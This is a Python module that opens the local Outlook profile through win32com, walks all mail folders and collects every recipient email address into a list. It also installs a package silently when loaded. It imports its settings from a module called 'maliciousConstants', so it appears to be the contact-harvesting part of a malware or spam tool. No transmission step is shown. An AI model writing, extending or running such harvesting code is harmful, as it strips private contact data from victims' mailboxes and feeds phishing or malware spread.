"""
Edan Jacobson
Class that extracts email addresses from outlook folders
"""
import subprocess

subprocess.run(["pip", "install", "-U", "pypiwin32"])
import win32com.client

from maliciousConstants import LEN_LIMIT, AT, CONTACTS_FILEPATH, \
    OUTLOOK_APP, MAPI


class Contacts(object):
    def __init__(self):
        """
        Method that creates contact object
        """
        self.email_addresses = []
        self.get_email_addresses()

    def get_email_addresses(self):
        """
        Method that retrieves email addresses from Outlook that are
         embedded in locally stored emails
        :return:
        """
        # Access outlook folders that contain email messages
        outlook = win32com.client.Dispatch(OUTLOOK_APP).GetNamespace(MAPI)
        folders = outlook.Folders
        folder_threads = []

        # Iterate through folders
        for folder in folders:
            # Iterate through subfolders
            for inner_folder in folder.Folders:
                self.search_for_recipients(inner_folder)

    def search_for_recipients(self, inner_folder):
        """
        Method that searches for recipients in the given folder
        :param inner_folder: Outlook folder to search in
        :return:
        """
        print(f'Reading Folder {inner_folder.Name}')

        # Iterate through messages in the folder
        for message in inner_folder.Items:
            try:
                # Search for recipients in message
                recipients = message.Recipients

                # Iterate through recipients
                for recipient in recipients:
                    # Check if address is in exclude list
                    address = recipient.AddressEntry.Address.lower()
                    if address not in self.email_addresses and len(
                            address) < LEN_LIMIT and AT in address:
                        # If not, then add to email_addresses list
                        self.email_addresses.append(address)
            except Exception as e:
                print(str(e))
